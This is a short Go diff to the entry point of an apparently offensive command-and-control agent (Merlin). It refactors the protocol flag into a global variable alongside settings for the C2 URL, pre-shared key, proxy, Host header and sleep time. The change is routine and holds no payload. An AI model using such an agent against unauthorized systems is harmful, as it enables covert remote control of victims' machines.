@@ -34,6 +34,7 @@ import (
 
 // GLOBAL VARIABLES
 var url = "https://127.0.0.1:443"
+var protocol = "h2"
 var build = "nonRelease"
 var psk = "merlin"
 var proxy = ""
@@ -45,7 +46,7 @@ func main() {
 	debug := flag.Bool("debug", false, "Enable debug output")
 	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
 	flag.StringVar(&psk, "psk", psk, "Pre-Shared Key used to encrypt initial communications")
-	protocol := flag.String("proto", "h2", "Protocol for the agent to connect with [h2, hq, https/1.1]")
+	flag.StringVar(&protocol, "proto", protocol, "Protocol for the agent to connect with [https (HTTP/1.1), h2 (HTTP/2), hq (QUIC or HTTP/3.0)]")
 	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
 	flag.StringVar(&host, "host", host, "HTTP Host header")
 	sleep := flag.Duration("sleep", 30000*time.Millisecond, "Time for agent to sleep")
@@ -59,7 +60,7 @@ func main() {
 	}
 
 	// Setup and run agent
-	a, err := agent.New(*protocol, url, host, psk, proxy, *verbose, *debug)
+	a, err := agent.New(protocol, url, host, psk, proxy, *verbose, *debug)
 	if err != nil {
 		if *verbose {
 			color.Red(err.Error())
